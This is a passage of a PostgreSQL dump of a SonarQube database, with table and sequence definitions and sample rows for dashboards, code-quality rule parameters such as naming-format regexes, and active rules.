CREATE SEQUENCE rules_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE rules_id_seq OWNER TO sonar;

--
-- Name: rules_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE rules_id_seq OWNED BY rules.id;


--
-- Name: rules_parameters; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE rules_parameters (
    id integer NOT NULL,
    rule_id integer NOT NULL,
    name character varying(128) NOT NULL,
    description character varying(4000),
    param_type character varying(512) NOT NULL,
    default_value character varying(4000)
);


ALTER TABLE rules_parameters OWNER TO sonar;

--
-- Name: rules_parameters_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE rules_parameters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE rules_parameters_id_seq OWNER TO sonar;

--
-- Name: rules_parameters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE rules_parameters_id_seq OWNED BY rules_parameters.id;


--
-- Name: rules_profiles; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE rules_profiles (
    id integer NOT NULL,
    name character varying(100) NOT NULL,
    language character varying(20),
    kee character varying(255) NOT NULL,
    parent_kee character varying(255),
    rules_updated_at character varying(100),
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    is_default boolean DEFAULT false NOT NULL
);


ALTER TABLE rules_profiles OWNER TO sonar;

--
-- Name: rules_profiles_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE rules_profiles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE rules_profiles_id_seq OWNER TO sonar;

--
-- Name: rules_profiles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE rules_profiles_id_seq OWNED BY rules_profiles.id;


--
-- Name: schema_migrations; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE schema_migrations (
    version character varying(255) NOT NULL
);


ALTER TABLE schema_migrations OWNER TO sonar;

--
-- Name: snapshots; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE snapshots (
    id integer NOT NULL,
    project_id integer NOT NULL,
    parent_snapshot_id integer,
    status character varying(4) DEFAULT 'U'::character varying NOT NULL,
    islast boolean DEFAULT false NOT NULL,
    scope character varying(3),
    qualifier character varying(10),
    root_snapshot_id integer,
    version character varying(500),
    path character varying(500),
    depth integer,
    root_project_id integer,
    purge_status integer,
    period1_mode character varying(100),
    period1_param character varying(100),
    period2_mode character varying(100),
    period2_param character varying(100),
    period3_mode character varying(100),
    period3_param character varying(100),
    period4_mode character varying(100),
    period4_param character varying(100),
    period5_mode character varying(100),
    period5_param character varying(100),
    created_at bigint,
    build_date bigint,
    period1_date bigint,
    period2_date bigint,
    period3_date bigint,
    period4_date bigint,
    period5_date bigint
);


ALTER TABLE snapshots OWNER TO sonar;

--
-- Name: snapshots_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE snapshots_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE snapshots_id_seq OWNER TO sonar;

--
-- Name: snapshots_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE snapshots_id_seq OWNED BY snapshots.id;


--
-- Name: user_roles; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE user_roles (
    id integer NOT NULL,
    user_id integer,
    resource_id integer,
    role character varying(64) NOT NULL
);


ALTER TABLE user_roles OWNER TO sonar;

--
-- Name: user_roles_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE user_roles_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE user_roles_id_seq OWNER TO sonar;

--
-- Name: user_roles_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE user_roles_id_seq OWNED BY user_roles.id;


--
-- Name: user_tokens; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE user_tokens (
    id integer NOT NULL,
    login character varying(255) NOT NULL,
    name character varying(100) NOT NULL,
    token_hash character varying(255) NOT NULL,
    created_at bigint NOT NULL
);


ALTER TABLE user_tokens OWNER TO sonar;

--
-- Name: user_tokens_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE user_tokens_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE user_tokens_id_seq OWNER TO sonar;

--
-- Name: user_tokens_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE user_tokens_id_seq OWNED BY user_tokens.id;


--
-- Name: users; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE users (
    id integer NOT NULL,
    login character varying(255),
    name character varying(200),
    email character varying(100),
    crypted_password character varying(40),
    salt character varying(40),
    remember_token character varying(500),
    remember_token_expires_at timestamp without time zone,
    active boolean DEFAULT true,
    created_at bigint,
    updated_at bigint,
    scm_accounts character varying(4000),
    external_identity character varying(255),
    external_identity_provider character varying(100),
    user_local boolean
);


ALTER TABLE users OWNER TO sonar;

--
-- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE users_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE users_id_seq OWNER TO sonar;

--
-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE users_id_seq OWNED BY users.id;


--
-- Name: widget_properties; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE widget_properties (
    id integer NOT NULL,
    widget_id integer NOT NULL,
    kee character varying(100),
    text_value character varying(4000)
);


ALTER TABLE widget_properties OWNER TO sonar;

--
-- Name: widget_properties_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE widget_properties_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE widget_properties_id_seq OWNER TO sonar;

--
-- Name: widget_properties_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE widget_properties_id_seq OWNED BY widget_properties.id;


--
-- Name: widgets; Type: TABLE; Schema: public; Owner: sonar
--

CREATE TABLE widgets (
    id integer NOT NULL,
    dashboard_id integer NOT NULL,
    widget_key character varying(256) NOT NULL,
    name character varying(256),
    description character varying(1000),
    column_index integer,
    row_index integer,
    configured boolean,
    created_at timestamp without time zone,
    updated_at timestamp without time zone,
    resource_id integer
);


ALTER TABLE widgets OWNER TO sonar;

--
-- Name: widgets_id_seq; Type: SEQUENCE; Schema: public; Owner: sonar
--

CREATE SEQUENCE widgets_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE widgets_id_seq OWNER TO sonar;

--
-- Name: widgets_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: sonar
--

ALTER SEQUENCE widgets_id_seq OWNED BY widgets.id;


--
-- Name: active_dashboards id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY active_dashboards ALTER COLUMN id SET DEFAULT nextval('active_dashboards_id_seq'::regclass);


--
-- Name: active_rule_parameters id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY active_rule_parameters ALTER COLUMN id SET DEFAULT nextval('active_rule_parameters_id_seq'::regclass);


--
-- Name: active_rules id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY active_rules ALTER COLUMN id SET DEFAULT nextval('active_rules_id_seq'::regclass);


--
-- Name: activities id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY activities ALTER COLUMN id SET DEFAULT nextval('activities_id_seq'::regclass);


--
-- Name: authors id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY authors ALTER COLUMN id SET DEFAULT nextval('authors_id_seq'::regclass);


--
-- Name: ce_activity id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY ce_activity ALTER COLUMN id SET DEFAULT nextval('ce_activity_id_seq'::regclass);


--
-- Name: ce_queue id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY ce_queue ALTER COLUMN id SET DEFAULT nextval('ce_queue_id_seq'::regclass);


--
-- Name: dashboards id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY dashboards ALTER COLUMN id SET DEFAULT nextval('dashboards_id_seq'::regclass);


--
-- Name: duplications_index id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY duplications_index ALTER COLUMN id SET DEFAULT nextval('duplications_index_id_seq'::regclass);


--
-- Name: events id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY events ALTER COLUMN id SET DEFAULT nextval('events_id_seq'::regclass);


--
-- Name: file_sources id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY file_sources ALTER COLUMN id SET DEFAULT nextval('file_sources_id_seq'::regclass);


--
-- Name: group_roles id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY group_roles ALTER COLUMN id SET DEFAULT nextval('group_roles_id_seq'::regclass);


--
-- Name: groups id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY groups ALTER COLUMN id SET DEFAULT nextval('groups_id_seq'::regclass);


--
-- Name: issue_changes id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issue_changes ALTER COLUMN id SET DEFAULT nextval('issue_changes_id_seq'::regclass);


--
-- Name: issue_filter_favourites id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issue_filter_favourites ALTER COLUMN id SET DEFAULT nextval('issue_filter_favourites_id_seq'::regclass);


--
-- Name: issue_filters id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issue_filters ALTER COLUMN id SET DEFAULT nextval('issue_filters_id_seq'::regclass);


--
-- Name: issues id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY issues ALTER COLUMN id SET DEFAULT nextval('issues_id_seq'::regclass);


--
-- Name: loaded_templates id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY loaded_templates ALTER COLUMN id SET DEFAULT nextval('loaded_templates_id_seq'::regclass);


--
-- Name: manual_measures id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY manual_measures ALTER COLUMN id SET DEFAULT nextval('manual_measures_id_seq'::regclass);


--
-- Name: measure_filter_favourites id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY measure_filter_favourites ALTER COLUMN id SET DEFAULT nextval('measure_filter_favourites_id_seq'::regclass);


--
-- Name: measure_filters id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY measure_filters ALTER COLUMN id SET DEFAULT nextval('measure_filters_id_seq'::regclass);


--
-- Name: metrics id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY metrics ALTER COLUMN id SET DEFAULT nextval('metrics_id_seq'::regclass);


--
-- Name: notifications id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY notifications ALTER COLUMN id SET DEFAULT nextval('notifications_id_seq'::regclass);


--
-- Name: perm_templates_groups id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY perm_templates_groups ALTER COLUMN id SET DEFAULT nextval('perm_templates_groups_id_seq'::regclass);


--
-- Name: perm_templates_users id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY perm_templates_users ALTER COLUMN id SET DEFAULT nextval('perm_templates_users_id_seq'::regclass);


--
-- Name: permission_templates id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY permission_templates ALTER COLUMN id SET DEFAULT nextval('permission_templates_id_seq'::regclass);


--
-- Name: project_links id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY project_links ALTER COLUMN id SET DEFAULT nextval('project_links_id_seq'::regclass);


--
-- Name: project_measures id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY project_measures ALTER COLUMN id SET DEFAULT nextval('project_measures_id_seq'::regclass);


--
-- Name: project_qprofiles id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY project_qprofiles ALTER COLUMN id SET DEFAULT nextval('project_qprofiles_id_seq'::regclass);


--
-- Name: projects id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY projects ALTER COLUMN id SET DEFAULT nextval('projects_id_seq'::regclass);


--
-- Name: properties id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY properties ALTER COLUMN id SET DEFAULT nextval('properties_id_seq'::regclass);


--
-- Name: quality_gate_conditions id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY quality_gate_conditions ALTER COLUMN id SET DEFAULT nextval('quality_gate_conditions_id_seq'::regclass);


--
-- Name: quality_gates id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY quality_gates ALTER COLUMN id SET DEFAULT nextval('quality_gates_id_seq'::regclass);


--
-- Name: resource_index id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY resource_index ALTER COLUMN id SET DEFAULT nextval('resource_index_id_seq'::regclass);


--
-- Name: rules id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY rules ALTER COLUMN id SET DEFAULT nextval('rules_id_seq'::regclass);


--
-- Name: rules_parameters id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY rules_parameters ALTER COLUMN id SET DEFAULT nextval('rules_parameters_id_seq'::regclass);


--
-- Name: rules_profiles id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY rules_profiles ALTER COLUMN id SET DEFAULT nextval('rules_profiles_id_seq'::regclass);


--
-- Name: snapshots id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY snapshots ALTER COLUMN id SET DEFAULT nextval('snapshots_id_seq'::regclass);


--
-- Name: user_roles id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY user_roles ALTER COLUMN id SET DEFAULT nextval('user_roles_id_seq'::regclass);


--
-- Name: user_tokens id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY user_tokens ALTER COLUMN id SET DEFAULT nextval('user_tokens_id_seq'::regclass);


--
-- Name: users id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY users ALTER COLUMN id SET DEFAULT nextval('users_id_seq'::regclass);


--
-- Name: widget_properties id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY widget_properties ALTER COLUMN id SET DEFAULT nextval('widget_properties_id_seq'::regclass);


--
-- Name: widgets id; Type: DEFAULT; Schema: public; Owner: sonar
--

ALTER TABLE ONLY widgets ALTER COLUMN id SET DEFAULT nextval('widgets_id_seq'::regclass);


--
-- Data for Name: active_dashboards; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO active_dashboards (id, dashboard_id, user_id, order_index) VALUES (1, 1, NULL, 1);
INSERT INTO active_dashboards (id, dashboard_id, user_id, order_index) VALUES (2, 2, NULL, 2);


--
-- Data for Name: active_rule_parameters; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (1, 103, 127, '^[a-z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (2, 104, 126, '^[A-Z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (3, 106, 147, '7', 'max');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (4, 106, 148, '7', 'constructorMax');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (5, 108, 111, '5', 'max');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (6, 110, 157, '^[A-Z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (7, 111, 159, '^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (8, 112, 158, '^[a-z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (9, 113, 155, '^[a-z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (10, 114, 156, '^[A-Z][0-9]?$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (11, 115, 153, '^[a-z]+(\.[a-z][a-z0-9]*)*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (12, 170, 93, '3', 'threshold');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (13, 194, 142, '30', 'maximum');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (14, 346, 131, '^[a-z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (15, 375, 146, '15', 'Threshold');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (16, 421, 172, '7', 'maximumFunctionParameters');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (17, 422, 171, '3', 'max');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (18, 430, 167, '10', 'maximumFunctionComplexityThreshold');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (19, 444, 164, '3', 'maximumNestingLevel');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (20, 445, 178, 'false', 'considerJSDoc');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (21, 465, 179, '1000', 'maximum');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (22, 466, 163, '100', 'max');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (23, 508, 178, 'false', 'considerJSDoc');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (24, 532, 159, '^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (25, 533, 158, '^[a-z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (26, 534, 155, '^[a-z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (208, 4112, 159, '^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (209, 4113, 158, '^[a-z][a-zA-Z0-9]*$', 'format');
INSERT INTO active_rule_parameters (id, active_rule_id, rules_parameter_id, value, rules_parameter_key) VALUES (210, 4114, 155, '^[a-z][a-zA-Z0-9]*$', 'format');


--
-- Data for Name: active_rules; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (1, 1, 344, 3, NULL, 1510817821816, 1510817821816);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (2, 1, 362, 2, NULL, 1510817821845, 1510817821845);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (3, 1, 357, 2, NULL, 1510817821852, 1510817821852);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4, 1, 417, 3, NULL, 1510817821862, 1510817821862);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (5, 1, 389, 3, NULL, 1510817821872, 1510817821872);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (6, 1, 429, 1, NULL, 1510817821878, 1510817821878);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (7, 1, 321, 2, NULL, 1510817821884, 1510817821884);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (8, 1, 397, 2, NULL, 1510817821895, 1510817821895);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (9, 1, 325, 2, NULL, 1510817821902, 1510817821902);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (10, 1, 385, 2, NULL, 1510817821907, 1510817821907);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (11, 1, 314, 2, NULL, 1510817821915, 1510817821915);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (12, 1, 443, 2, NULL, 1510817821919, 1510817821919);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (13, 1, 445, 0, NULL, 1510817821931, 1510817821931);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (14, 1, 351, 3, NULL, 1510817821935, 1510817821935);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (15, 1, 403, 2, NULL, 1510817821940, 1510817821940);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (16, 1, 355, 2, NULL, 1510817821955, 1510817821955);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (17, 1, 356, 2, NULL, 1510817821976, 1510817821976);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (18, 1, 311, 3, NULL, 1510817821981, 1510817821981);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (19, 1, 308, 3, NULL, 1510817821984, 1510817821984);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (20, 1, 410, 4, NULL, 1510817821995, 1510817821995);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (21, 1, 337, 2, NULL, 1510817821999, 1510817821999);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (22, 1, 432, 2, NULL, 1510817822005, 1510817822005);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (23, 1, 393, 1, NULL, 1510817822009, 1510817822009);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (24, 1, 367, 3, NULL, 1510817822015, 1510817822015);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (25, 1, 446, 1, NULL, 1510817822026, 1510817822026);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (26, 1, 384, 3, NULL, 1510817822031, 1510817822031);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (27, 1, 302, 2, NULL, 1510817822036, 1510817822036);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (28, 1, 444, 3, NULL, 1510817822040, 1510817822040);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (29, 1, 449, 1, NULL, 1510817822044, 1510817822044);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (30, 1, 318, 2, NULL, 1510817822047, 1510817822047);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (31, 1, 402, 1, NULL, 1510817822054, 1510817822054);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (32, 1, 301, 3, NULL, 1510817822062, 1510817822062);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (33, 1, 348, 2, NULL, 1510817822068, 1510817822068);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (34, 1, 395, 2, NULL, 1510817822078, 1510817822078);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (35, 1, 353, 3, NULL, 1510817822083, 1510817822083);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (36, 1, 398, 3, NULL, 1510817822087, 1510817822087);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (37, 1, 375, 1, NULL, 1510817822091, 1510817822091);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (38, 1, 438, 2, NULL, 1510817822094, 1510817822094);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (39, 1, 442, 3, NULL, 1510817822099, 1510817822099);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (40, 1, 343, 2, NULL, 1510817822109, 1510817822109);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (41, 1, 422, 2, NULL, 1510817822152, 1510817822152);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (42, 1, 382, 3, NULL, 1510817822157, 1510817822157);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (43, 1, 423, 2, NULL, 1510817822162, 1510817822162);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (44, 1, 349, 3, NULL, 1510817822168, 1510817822168);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (45, 1, 412, 3, NULL, 1510817822172, 1510817822172);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (46, 1, 305, 2, NULL, 1510817822182, 1510817822182);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (47, 1, 437, 3, NULL, 1510817822186, 1510817822186);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (48, 1, 340, 1, NULL, 1510817822190, 1510817822190);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (49, 1, 317, 2, NULL, 1510817822194, 1510817822194);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (50, 1, 373, 2, NULL, 1510817822199, 1510817822199);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (51, 1, 374, 2, NULL, 1510817822206, 1510817822206);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (52, 1, 371, 1, NULL, 1510817822210, 1510817822210);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (53, 1, 313, 2, NULL, 1510817822214, 1510817822214);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (54, 1, 354, 2, NULL, 1510817822219, 1510817822219);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (55, 1, 401, 3, NULL, 1510817822223, 1510817822223);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (56, 1, 380, 1, NULL, 1510817822233, 1510817822233);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (57, 1, 304, 3, NULL, 1510817822237, 1510817822237);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (58, 1, 315, 2, NULL, 1510817822241, 1510817822241);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (59, 1, 307, 3, NULL, 1510817822245, 1510817822245);
